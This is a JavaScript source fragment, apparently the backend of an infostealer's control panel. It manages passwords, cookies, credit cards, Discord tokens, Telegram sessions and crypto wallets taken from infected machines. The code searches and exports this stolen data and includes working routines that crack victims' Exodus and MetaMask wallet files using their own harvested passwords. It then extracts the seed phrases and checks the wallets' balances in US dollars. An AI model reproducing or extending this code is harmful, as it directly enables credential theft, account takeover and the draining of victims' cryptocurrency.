      const rows = ctx.db.prepare(`SELECT source, phrase, addresses FROM seeds WHERE client_id = ? AND source LIKE 'wallet:%' AND valid = 1`).all(cid);
      const result = {};
      for (const r of rows) {
        const walletName = r.source.replace(/^wallet:/, '');
        result[walletName] = { mnemonic: r.phrase, addresses: JSON.parse(r.addresses || '[]') };
      }
      return result;
    },
    list_app_credentials(ctx, params)   { return listTable(ctx, TABLE_CFGS.app_credentials,   params); },
    list_gaming_items(ctx, params)      { return listTable(ctx, TABLE_CFGS.gaming_items,      params); },
    list_vpn_items(ctx, params)         { return listTable(ctx, TABLE_CFGS.vpn_items,         params); },

    export_client(ctx, params) {
      const cid = params?.clientId;
      const p = { clientId: cid, limit: 0 };
      const result = {};
      for (const [key, cfg] of Object.entries(TABLE_CFGS))
        result[key] = listTable(ctx, cfg, p).rows;
      if (cid) {
        const profiles = ctx.db.prepare(`
          SELECT dt.client_id as clientId, dt.token, dt.source,
                 dp.user_id, dp.username, dp.discriminator, dp.global_name,
                 dp.email, dp.phone, dp.verified, dp.mfa_enabled, dp.premium_type,
                 dp.friends_count, dp.guilds_count, dp.guild_names, dp.error
          FROM discord_tokens dt
          LEFT JOIN discord_profiles dp ON dp.token = dt.token
          WHERE dt.client_id = ?
          ORDER BY dt.captured_at DESC
        `).all(cid);
        result.discord_profiles = profiles;
      }
      return result;
    },

    list_collect_errors(ctx, params) {
      const cid = params?.clientId;
      const rows = cid
        ? ctx.db.prepare(`SELECT id, error, created_at FROM collect_errors WHERE client_id=? ORDER BY id DESC LIMIT 100`).all(cid)
        : ctx.db.prepare(`SELECT id, client_id, error, created_at FROM collect_errors ORDER BY id DESC LIMIT 100`).all();
      return { errors: rows };
    },

    clear_collect_errors(ctx, params) {
      const cid = params?.clientId;
      if (cid) ctx.db.prepare(`DELETE FROM collect_errors WHERE client_id=?`).run(cid);
      else ctx.db.prepare(`DELETE FROM collect_errors`).run();
      return { ok: true };
    },

    global_search(ctx, params) {
      const search = String(params?.search || '').trim();
      if (!search) return { groups: [] };
      const cid = params?.clientId;
      const perGroup = Math.max(1, Math.min(50, Number(params?.limit ?? 10)));
      const pattern = `%${search}%`;

      const SEARCH_TABLES = [
        { key: 'passwords',     label: 'Passwords',      cfg: TABLE_CFGS.passwords },
        { key: 'cookies',       label: 'Cookies',        cfg: TABLE_CFGS.cookies },
        { key: 'autofill',      label: 'Autofill',       cfg: TABLE_CFGS.autofill },
        { key: 'history',       label: 'History',        cfg: TABLE_CFGS.history },
        { key: 'bookmarks',     label: 'Bookmarks',      cfg: TABLE_CFGS.bookmarks },
        { key: 'creditCards',   label: 'Credit Cards',   cfg: TABLE_CFGS.credit_cards },
        { key: 'discordTokens', label: 'Discord Tokens', cfg: TABLE_CFGS.discord_tokens },
        { key: 'files',         label: 'Files',          cfg: TABLE_CFGS.files },
        { key: 'extensions',    label: 'Extensions',     cfg: TABLE_CFGS.extensions },
        { key: 'wallets',       label: 'Wallets',        cfg: TABLE_CFGS.wallets },
        { key: 'keys',          label: 'Keys',           cfg: TABLE_CFGS.keys },
        { key: 'seeds',           label: 'Seeds',            cfg: TABLE_CFGS.seeds },
        { key: 'appCredentials', label: 'App Credentials', cfg: TABLE_CFGS.app_credentials },
      ];

      const groups = [];
      for (const { key, label, cfg } of SEARCH_TABLES) {
        if (!cfg.searchOn.length) continue;
        const wheres = [], args = [];
        if (cid) { wheres.push('client_id = ?'); args.push(cid); }
        wheres.push('(' + cfg.searchOn.map(c => `${c} LIKE ?`).join(' OR ') + ')');
        for (let i = 0; i < cfg.searchOn.length; i++) args.push(pattern);
        const where = ' WHERE ' + wheres.join(' AND ');
        const total = ctx.db.prepare(`SELECT COUNT(*) as n FROM ${cfg.tbl}${where}`).get(...args).n;
        if (total === 0) continue;
        const rows = ctx.db.prepare(`SELECT ${cfg.sel} FROM ${cfg.tbl}${where} ORDER BY ${cfg.order} LIMIT ${perGroup}`).all(...args);
        groups.push({ key, label, total, rows });
      }
      return { groups };
    },

    download_telegram(ctx, params) {
      const id = params?.id;
      if (!id) throw new Error("id required");
      const result = readTelegramContentById(ctx.db, id);
      if (!result) throw new Error("No data found");
      return { name: result.account + "_tdata.zip", content: result.content.toString('base64') };
    },

    list_wallet_data(ctx, params) {
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");
      const rows = ctx.db.prepare(`SELECT id, client_id AS clientId, name, path, type, addresses, vault_data IS NOT NULL AS hasVault, (content IS NOT NULL OR blob_path IS NOT NULL) AS hasContent, size, captured_at FROM wallet_data WHERE client_id = ? ORDER BY captured_at DESC`).all(cid);
      for (const r of rows) r.addresses = JSON.parse(r.addresses || '[]');
      return { rows, total: rows.length };
    },

    download_wallet_data(ctx, params) {
      const id = params?.id;
      if (!id) throw new Error("id required");
      const result = readWalletContentById(ctx.db, id);
      if (!result) throw new Error("No data found");
      return { name: result.name, content: result.content.toString('base64') };
    },

    async check_balances(ctx, params) {
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");

      const wallets = ctx.db.prepare(`SELECT name, addresses FROM wallet_data WHERE client_id = ? AND addresses IS NOT NULL AND addresses != '[]'`).all(cid);
      const allAddrs = [];
      for (const w of wallets) {
        for (const addr of JSON.parse(w.addresses || '[]'))
          allAddrs.push({ wallet: w.name, address: addr });
      }
      if (!allAddrs.length) return { results: [], message: "No addresses found" };

      const unique = [...new Set(allAddrs.map(a => a.address.toLowerCase()))];
      const balanceMap = {};

      await Promise.all(BALANCE_CHAINS.map(async (chain) => {
        try {
          const res = await fetchWithTimeout(chain.rpc, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(unique.map((addr, i) => ({
              jsonrpc: "2.0", method: "eth_getBalance", params: [addr, "latest"], id: i,
            }))),
          });
          const data = await res.json();
          for (const r of Array.isArray(data) ? data : [data]) {
            if (!r.result) continue;
            const addr = unique[r.id];
            const wei = BigInt(r.result);
            if (wei === 0n) continue;
            if (!balanceMap[addr]) balanceMap[addr] = {};
            balanceMap[addr][chain.name] = Number(wei) / 1e18;
          }
        } catch (_) {}
      }));

      const results = allAddrs.map(a => ({
        wallet: a.wallet,
        address: a.address,
        balances: balanceMap[a.address.toLowerCase()] || {},
      }));
      return { results };
    },

    async crack_exodus(ctx, params) {
      const cid = params?.clientId;
      const walletName = params?.walletName || "Exodus";
      if (!cid) throw new Error("clientId required");

      const content = readWalletContent(ctx.db, cid, walletName);
      if (!content) return { cracked: false, tried: 0, skipped: true, reason: "No wallet content found" };

      const passwords = ctx.db.prepare(`SELECT DISTINCT password FROM passwords WHERE client_id = ? AND password IS NOT NULL AND password != ''`).all(cid).map(r => r.password);
      if (!passwords.length) return { cracked: false, tried: 0, skipped: true, reason: "No passwords available" };

      function extractFromZip(buf, targetSuffix) {
        function findEOCD(b) { for (let i = b.length - 22; i >= Math.max(0, b.length - 65557); i--) if (b.readUInt32LE(i) === 0x06054b50) return i; return -1; }
        const eocd = findEOCD(buf);
        if (eocd < 0) return null;
        const cdOff = buf.readUInt32LE(eocd + 16);
        const cdCount = buf.readUInt16LE(eocd + 10);
        let off = cdOff;
        for (let i = 0; i < cdCount; i++) {
          if (buf.readUInt32LE(off) !== 0x02014b50) break;
          const compMethod = buf.readUInt16LE(off + 10);
          const compSize = buf.readUInt32LE(off + 20);
          const fnameLen = buf.readUInt16LE(off + 28);
          const extraLen = buf.readUInt16LE(off + 30);
          const commentLen = buf.readUInt16LE(off + 32);
          const localOffset = buf.readUInt32LE(off + 42);
          const fname = buf.slice(off + 46, off + 46 + fnameLen).toString('utf8');
          if (fname.endsWith(targetSuffix)) {
            const lfn = buf.readUInt16LE(localOffset + 26);
            const lex = buf.readUInt16LE(localOffset + 28);
            const dataStart = localOffset + 30 + lfn + lex;
            const comp = buf.slice(dataStart, dataStart + compSize);
            if (compMethod === 0) return comp;
            if (compMethod === 8) return inflateRawSync(comp);
          }
          off += 46 + fnameLen + extraLen + commentLen;
        }
        return null;
      }

      function getSecoBuffer(buf, filename) {
        if (buf.readUInt32LE(0) === 0x04034b50) return extractFromZip(buf, filename);
        if (buf.slice(0, 4).toString('ascii') === 'SECO') return buf;
        return null;
      }

      const SUPPORTED_WALLETS = ['Exodus'];
      const supported = SUPPORTED_WALLETS.includes(walletName);
      const warning = supported ? null : `"${walletName}" is not a verified wallet. Only the following wallets have been tested: ${SUPPORTED_WALLETS.join(', ')}. Results may be inaccurate — verify manually.`;

      const seedBuf = getSecoBuffer(content, 'seed.seco');
      if (!seedBuf) return { cracked: false, tried: 0, skipped: true, reason: "No seed.seco found — wallet format not supported for this method" };

      for (const password of passwords) {
        try {
          const result = secoDecrypt(seedBuf, password);
          const dataLen = result.data.readUInt32BE(0);
          const shrinked = result.data.slice(4, dataLen + 4);
          const gunzipped = gunzipSync(shrinked);
          const mnemonic = seedFromBuffer(gunzipped).mnemonicString;
          const addresses = [
            ...deriveEthAddresses(mnemonic, 2).map(a => ({ chain: "EVM", address: a })),
            ...deriveBtcAddresses(mnemonic, 1).map(a => ({ chain: "BTC", address: a })),
            ...deriveLtcAddresses(mnemonic, 1).map(a => ({ chain: "LTC", address: a })),
            ...deriveTrxAddresses(mnemonic, 1).map(a => ({ chain: "TRX", address: a })),
          ];
          const words = mnemonic.split(/\s+/);
          stmts.insSeed.run(cid, `wallet:${walletName}`, null, mnemonic, words.length, 1, JSON.stringify(addresses), Date.now());
          return { cracked: true, password, mnemonic, addresses, warning };
        } catch (_) {
          continue;
        }
      }
      return { cracked: false, tried: passwords.length, warning };
    },

    async check_cracked_balances(ctx, params) {
      const mnemonic = params?.mnemonic;
      if (!mnemonic) throw new Error("mnemonic required");

      const ethAddrs = deriveEthAddresses(mnemonic, 3);
      const btcAddrs = deriveBtcAddresses(mnemonic, 2);
      const ltcAddrs = deriveLtcAddresses(mnemonic, 2);
      const trxAddrs = deriveTrxAddresses(mnemonic, 2);

      const [evmNative, erc20, btcBals, ltcBals, trxBals] = await Promise.all([
        checkEvmNativeBalances(ethAddrs),
        checkErc20Balances(ethAddrs),
        checkBtcBalances(btcAddrs),
        checkLtcBalances(ltcAddrs),
        checkTrxBalances(trxAddrs),
      ]);

      const totals = {};
      function merge(balMap) {
        for (const addr of Object.keys(balMap)) {
          for (const [chain, val] of Object.entries(balMap[addr])) {
            totals[chain] = (totals[chain] || 0) + val;
          }
        }
      }
      merge(evmNative);
      merge(erc20);
      merge(btcBals);
      merge(ltcBals);
      merge(trxBals);

      // Fetch USD prices
      let usdTotal = 0;
      const usdByAsset = {};
      try {
        const ids = "bitcoin,ethereum,tron,litecoin,binancecoin,matic-network,avalanche-2";
        const priceRes = await fetchWithTimeout(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
        const prices = await priceRes.json();
        const priceMap = {
          BTC: prices.bitcoin?.usd || 0,
          LTC: prices.litecoin?.usd || 0,
          ETH: prices.ethereum?.usd || 0,
          BSC: prices.binancecoin?.usd || 0,
          Polygon: prices["matic-network"]?.usd || 0,
          Arbitrum: prices.ethereum?.usd || 0,
          Optimism: prices.ethereum?.usd || 0,
          Base: prices.ethereum?.usd || 0,
          Avalanche: prices["avalanche-2"]?.usd || 0,
          TRX: prices.tron?.usd || 0,
        };
        for (const [asset, amount] of Object.entries(totals)) {
          // Stablecoins
          if (asset.includes("USDT") || asset.includes("USDC") || asset.includes("DAI")) {
            const usd = amount;
            usdByAsset[asset] = usd;
            usdTotal += usd;
          } else {
            const price = priceMap[asset] || 0;
            const usd = amount * price;
            if (usd > 0) {
              usdByAsset[asset] = usd;
              usdTotal += usd;
            }
          }
        }
      } catch (_) {}

      const allAddresses = [
        ...ethAddrs.map(a => ({ chain: "EVM", address: a })),
        ...btcAddrs.map(a => ({ chain: "BTC", address: a })),
        ...ltcAddrs.map(a => ({ chain: "LTC", address: a })),
        ...trxAddrs.map(a => ({ chain: "TRX", address: a })),
      ];

      return { addresses: allAddresses, totals, usdTotal: Math.round(usdTotal * 100) / 100, usdByAsset };
    },

    async crack_vault(ctx, params) {
      const cid = params?.clientId;
      const walletName = params?.walletName;
      if (!cid) throw new Error("clientId required");
      if (!walletName) throw new Error("walletName required");

      const SUPPORTED_VAULTS = ['MetaMask'];
      const supported = SUPPORTED_VAULTS.some(s => walletName.toLowerCase().includes(s.toLowerCase()));
      const warning = supported ? null : `"${walletName}" is not a verified vault wallet. Only the following have been tested: ${SUPPORTED_VAULTS.join(', ')}. Results may be inaccurate — verify manually.`;

      const wallet = ctx.db.prepare(`SELECT vault_data FROM wallet_data WHERE client_id = ? AND name = ? AND vault_data IS NOT NULL`).get(cid, walletName);
      if (!wallet?.vault_data) return { cracked: false, tried: 0, skipped: true, reason: "No vault data found for this wallet" };

      const passwords = ctx.db.prepare(`SELECT DISTINCT password FROM passwords WHERE client_id = ? AND password IS NOT NULL AND password != ''`).all(cid).map(r => r.password);
      if (!passwords.length) return { cracked: false, tried: 0, skipped: true, reason: "No passwords available" };

      const vault = JSON.parse(wallet.vault_data);
      const dataBytes = Uint8Array.from(atob(vault.data), c => c.charCodeAt(0));
      const iv = Uint8Array.from(atob(vault.iv), c => c.charCodeAt(0));
      const salt = Uint8Array.from(atob(vault.salt), c => c.charCodeAt(0));

      const enc = new TextEncoder();
      for (const password of passwords) {
        try {
          const keyMaterial = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveKey']);
          const key = await crypto.subtle.deriveKey(
            { name: 'PBKDF2', salt, iterations: 600000, hash: 'SHA-256' },
            keyMaterial,
            { name: 'AES-GCM', length: 256 },
            false, ['decrypt'],
          );
          const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, dataBytes);
          const decoded = new TextDecoder().decode(decrypted);
          const result = JSON.parse(decoded);
          const accounts = extractVaultAccounts(result);
          const mnemonic = accounts.find(a => a.mnemonic)?.mnemonic || null;
          if (mnemonic) {
            const words = mnemonic.split(/\s+/);
            const addresses = [
              ...deriveEthAddresses(mnemonic, 2).map(a => ({ chain: "EVM", address: a })),
              ...deriveBtcAddresses(mnemonic, 1).map(a => ({ chain: "BTC", address: a })),
              ...deriveLtcAddresses(mnemonic, 1).map(a => ({ chain: "LTC", address: a })),
              ...deriveTrxAddresses(mnemonic, 1).map(a => ({ chain: "TRX", address: a })),
            ];
            stmts.insSeed.run(cid, `wallet:${walletName}`, null, mnemonic, words.length, 1, JSON.stringify(addresses), Date.now());
          }
          return { cracked: true, password, mnemonic, accounts, warning };
        } catch (_) {
          continue;
        }
      }
      return { cracked: false, tried: passwords.length, warning };
    },

    async check_seed_balances(ctx, params) {
      const id = params?.id;
      if (!id) throw new Error("id required");
      const row = ctx.db.prepare(`SELECT phrase, valid FROM seeds WHERE id = ?`).get(id);
      if (!row) throw new Error("Seed not found");
      if (!row.valid) throw new Error("Seed phrase is not a valid BIP39 mnemonic");
      return this.check_cracked_balances(ctx, { mnemonic: row.phrase });
    },

    get_capture_settings(ctx) {
      return { ...pluginSettings };
    },

    update_capture_settings(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const upsert = ctx.db.prepare(`INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)`);
      if (params.capture_history !== undefined) upsert.run('capture_history', params.capture_history ? '1' : '0');
      if (params.capture_cookies !== undefined) upsert.run('capture_cookies', params.capture_cookies ? '1' : '0');
      if (params.history_limit !== undefined) upsert.run('history_limit', String(Math.max(0, Number(params.history_limit) || 0)));
      if (params.cookie_max_age_days !== undefined) upsert.run('cookie_max_age_days', String(Math.max(0, Number(params.cookie_max_age_days) || 0)));
      loadSettings(ctx.db);
      return { ok: true, settings: { ...pluginSettings } };
    },

    purge_history(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const cid = params?.clientId;
      let r;
      if (cid) r = ctx.db.prepare(`DELETE FROM history WHERE client_id = ?`).run(cid);
      else r = ctx.db.exec(`DELETE FROM history`);
      const changes = r?.changes ?? 0;
      try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}
      return { ok: true, deleted: changes };
    },

    purge_cookies(ctx, params, { caller }) {
      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
      const cid = params?.clientId;
      let r;
      if (cid) r = ctx.db.prepare(`DELETE FROM cookies WHERE client_id = ?`).run(cid);
      else r = ctx.db.exec(`DELETE FROM cookies`);
      const changes = r?.changes ?? 0;
      try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}
      return { ok: true, deleted: changes };
    },

    delete_client(ctx, params, { caller }) {
      if (!["admin", "user"].includes(caller.role)) throw new Error("Insufficient permissions");
      const cid = params?.clientId;
      if (!cid) throw new Error("clientId required");
      clearClient(ctx.db, cid);
      ctx.db.prepare(`DELETE FROM client_runs WHERE client_id=?`).run(cid);
      ctx.broadcast("client_deleted", { clientId: cid });
      return { ok: true };
    },

    delete_all(ctx, _params, { caller }) {
      if (caller.role !== "admin") throw new Error("Admin only");
      deleteAllBlobs();
      for (const tbl of ["passwords","cookies","autofill","history","bookmarks","credit_cards","discord_tokens","discord_profiles","files","extensions","wallets","wallet_data","telegram_sessions","cloud_keys","seeds","app_credentials","gaming_items","vpn_items","client_runs"])
        ctx.db.exec(`DELETE FROM ${tbl}`);
      try { ctx.db.exec(`PRAGMA incremental_vacuum`); } catch (_) {}
      ctx.broadcast("cleared", { by: caller.id });
      return { ok: true };
    },
  },
};
